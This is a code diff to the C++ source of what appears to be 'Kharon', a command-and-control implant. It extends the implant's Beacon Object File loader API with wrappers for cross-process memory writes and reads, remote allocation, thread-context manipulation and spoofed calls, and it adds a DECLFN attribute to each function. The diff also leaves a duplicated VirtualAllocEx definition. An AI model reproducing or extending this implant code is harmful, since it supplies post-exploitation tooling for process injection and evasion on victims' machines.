@@ -1,6 +1,6 @@
 #include <Kharon.h>
 
-auto Coff::DataParse(
+auto DECLFN Coff::DataParse(
     DATAP* parser, 
     PCHAR  buffer, 
     INT    size
@@ -18,7 +18,7 @@ auto Coff::DataParse(
     parser->buffer   += 4;
 }
 
-auto Coff::Output( 
+auto DECLFN Coff::Output( 
     INT  type, 
     PCCH data, 
     INT  len
@@ -35,7 +35,7 @@ auto Coff::Output(
     Self->Pkg->SendOut( UUID, CommandID, (BYTE*)data, len, type );
 }
 
-auto Coff::Printf(
+auto DECLFN Coff::Printf(
     INT  type,
     PCCH fmt,
     ...
@@ -72,7 +72,7 @@ _KH_END:
     if ( MsgBuff ) Self->Hp->Free( MsgBuff );
 }
 
-auto Coff::DataExtract(
+auto DECLFN Coff::DataExtract(
     DATAP* parser, 
     PINT   size
 ) -> PCHAR {
@@ -80,27 +80,27 @@ auto Coff::DataExtract(
     return (PCHAR)Self->Psr->Bytes( (PPARSER)parser, (ULONG*)size );
 }
 
-auto Coff::DataInt(
+auto DECLFN Coff::DataInt(
     DATAP* parser
 )-> INT {
     G_KHARON
     return Self->Psr->Int32( (PPARSER)parser );
 }
 
-auto Coff::DataShort(
+auto DECLFN Coff::DataShort(
     DATAP* parser
 ) -> SHORT {
     G_KHARON
     return Self->Psr->Int16( (PPARSER)parser );
 }
 
-auto Coff::DataLength(
+auto DECLFN Coff::DataLength(
     DATAP* parser
 ) -> INT32 {
     return parser->length;
 }
 
-auto Coff::FmtAlloc(
+auto DECLFN Coff::FmtAlloc(
     FMTP*  Fmt,
     INT32  Maxsz
 ) -> VOID {
@@ -114,7 +114,7 @@ auto Coff::FmtAlloc(
     Fmt->size     = Maxsz;
 }
 
-auto Coff::FmtReset(
+auto DECLFN Coff::FmtReset(
     FMTP* Fmt
 ) -> VOID {
     Mem::Zero( (UPTR)Fmt->original, Fmt->size );
@@ -122,7 +122,7 @@ auto Coff::FmtReset(
     Fmt->length = Fmt->size;
 }
 
-auto Coff::FmtAppend(
+auto DECLFN Coff::FmtAppend(
     FMTP* Fmt,
     CHAR* Data,
     INT32 Len
@@ -132,7 +132,7 @@ auto Coff::FmtAppend(
     Fmt->length += Len;
 }
 
-auto Coff::FmtPrintf(
+auto DECLFN Coff::FmtPrintf(
     FMTP* Fmt,
     CHAR* Data,
     ...
@@ -150,7 +150,7 @@ auto Coff::FmtPrintf(
     Fmt->length += Len;
 }
 
-auto Coff::FmtInt(
+auto DECLFN Coff::FmtInt(
     FMTP* Fmt,
     INT32 Val
 ) -> VOID {
@@ -162,7 +162,7 @@ auto Coff::FmtInt(
     return;
 }
 
-auto Coff::GetSpawn(
+auto DECLFN Coff::GetSpawn(
     BOOL  x86, 
     CHAR* buffer, 
     INT32 length
@@ -174,7 +174,7 @@ auto Coff::GetSpawn(
     // return Self->Ps->Ctx
 }
 
-auto Coff::FmtFree(
+auto DECLFN Coff::FmtFree(
     FMTP* Fmt
 )-> VOID {
     G_KHARON
@@ -190,7 +190,7 @@ auto Coff::FmtFree(
     Fmt->length = Fmt->size = 0;
 }
 
-auto Coff::OpenProcess(
+auto DECLFN Coff::OpenProcess(
     DWORD desiredAccess, 
     BOOL  inheritHandle, 
     DWORD processId
@@ -199,8 +199,30 @@ auto Coff::OpenProcess(
     return Self->Ps->Open( desiredAccess, inheritHandle, processId );
 }
 
-auto Coff::VirtualAlloc(
-    LPVOID Address, 
+auto DECLFN Coff::WriteProcessMemory(
+    HANDLE hProcess, 
+    PVOID  BaseAddress, 
+    PVOID  Buffer, 
+    SIZE_T Size,  
+    SIZE_T *Written
+)->BOOL {
+    G_KHARON
+    return Self->Mm->Write( BaseAddress, (BYTE*)Buffer, Size, Written );
+}
+
+auto DECLFN Coff::ReadProcessMemory(
+    HANDLE hProcess, 
+    PVOID  BaseAddress, 
+    PVOID  Buffer,  
+    SIZE_T Size,  
+    SIZE_T *Read
+)->BOOL {
+    G_KHARON
+    return Self->Mm->Read( BaseAddress, (BYTE*)Buffer, Size, Read, hProcess );
+}
+
+auto DECLFN Coff::VirtualAlloc(
+    PVOID Address, 
     SIZE_T Size, 
     DWORD  AllocType, 
     DWORD  Protect
@@ -209,7 +231,18 @@ auto Coff::VirtualAlloc(
     return Self->Mm->Alloc( Address, Size, AllocType, Protect );
 }
 
-auto Coff::VirtualAllocEx(
+auto DECLFN Coff::VirtualAllocEx(
+    HANDLE Handle,
+    PVOID  Address, 
+    SIZE_T Size, 
+    DWORD  AllocType, 
+    DWORD  Protect
+) -> PVOID {
+    G_KHARON
+    return Self->Mm->Alloc( Address, Size, AllocType, Protect, Handle );
+}
+
+auto DECLFN Coff::VirtualAllocEx(
     HANDLE Handle,
     LPVOID Address, 
     SIZE_T Size, 
@@ -220,7 +253,7 @@ auto Coff::VirtualAllocEx(
     return Self->Mm->Alloc( Address, Size, AllocType, Protect, Handle );
 }
 
-auto Coff::VirtualProtect(
+auto DECLFN Coff::VirtualProtect(
     LPVOID Address, 
     SIZE_T Size, 
     DWORD  NewProtect, 
@@ -230,7 +263,7 @@ auto Coff::VirtualProtect(
     return Self->Mm->Protect( Address, Size, NewProtect, OldProtect );
 }
 
-auto Coff::VirtualProtectEx(
+auto DECLFN Coff::VirtualProtectEx(
     HANDLE Handle,
     LPVOID Address, 
     SIZE_T Size, 
@@ -241,7 +274,7 @@ auto Coff::VirtualProtectEx(
     return Self->Mm->Protect( Address, Size, NewProtect, OldProtect, Handle );
 }
 
-auto Coff::OpenThread(
+auto DECLFN Coff::OpenThread(
     DWORD desiredAccess, 
     BOOL  inheritHandle, 
     DWORD threadId
@@ -250,14 +283,14 @@ auto Coff::OpenThread(
     return Self->Td->Open( desiredAccess, inheritHandle, threadId );
 }
 
-auto Coff::LoadLibraryA(
+auto DECLFN Coff::LoadLibraryA(
     CHAR* LibraryName
 ) -> HMODULE {
     G_KHARON
     return (HMODULE)Self->Lib->Load( LibraryName );
 }
 
-auto Coff::LoadLibraryW(
+auto DECLFN Coff::LoadLibraryW(
     WCHAR* LibraryName
 ) -> HMODULE {
     G_KHARON
@@ -268,7 +301,7 @@ auto Coff::LoadLibraryW(
     return (HMODULE)Self->Lib->Load( LibA );
 }
 
-auto Coff::CLRCreateInstance(
+auto DECLFN Coff::CLRCreateInstance(
     const IID &clsid, const IID &riid, LPVOID *ppInterface
 ) -> HRESULT {
     G_KHARON
@@ -281,20 +314,35 @@ auto Coff::CLRCreateInstance(
     );
 }
 
-auto Coff::SetThreadContext(
-    HANDLE  Handle,
-    CONTEXT Ctx
+auto DECLFN Coff::SetThreadContext(
+    HANDLE   Handle,
+    CONTEXT* Ctx
 ) -> BOOL {
     G_KHARON
     return Self->Td->SetCtx( Handle, Ctx );
 }
 
-auto Coff::GetThreadContext(
-    HANDLE  Handle,
-    CONTEXT Ctx
+auto DECLFN Coff::GetThreadContext(
+    HANDLE   Handle,
+    CONTEXT* Ctx
 ) -> BOOL {
     G_KHARON
     return Self->Td->GetCtx( Handle, Ctx );
+}
+
+auto DECLFN Coff::CoInitialize(
+    LPVOID pvReserved
+) -> HRESULT {
+    G_KHARON
+    return (HRESULT)Self->Spf->Call( (UPTR)Self->Ole32.CoInitialize, 0, (UPTR)pvReserved );
+}
+
+auto DECLFN Coff::CoInitializeEx(
+    LPVOID pvReserved,
+    DWORD  dwCoInit
+) -> HRESULT {
+    G_KHARON
+    return (HRESULT)Self->Spf->Call( (UPTR)Self->Ole32.CoInitializeEx, 0, (UPTR)pvReserved, dwCoInit );
 }
 
 auto Coff::UseToken(
